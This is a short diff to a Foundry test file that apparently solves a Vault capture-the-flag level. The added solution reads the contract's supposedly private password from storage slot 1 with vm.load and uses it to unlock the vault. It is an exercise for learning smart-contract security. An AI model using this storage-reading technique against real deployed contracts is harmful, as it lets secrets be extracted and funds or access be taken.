@@ -17,5 +17,9 @@ contract VaultLevel is SetUpLevelTest {
         vault = Vault(instance);
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
+        vault.unlock(password);
+        vm.stopPrank();
     }
 }
